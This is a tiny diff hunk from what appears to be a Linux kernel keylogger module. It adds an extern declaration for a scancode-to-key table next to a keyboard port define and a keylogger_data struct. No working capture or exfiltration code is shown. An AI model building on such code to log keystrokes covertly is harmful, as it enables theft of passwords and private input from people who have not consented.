@@ -19,6 +19,7 @@ MODULE_LICENSE("GPL");
 
 #define KB_PORT 0x60
 
+extern struct key_info scancode_to_key;
 
 typedef struct keylogger_data
 {
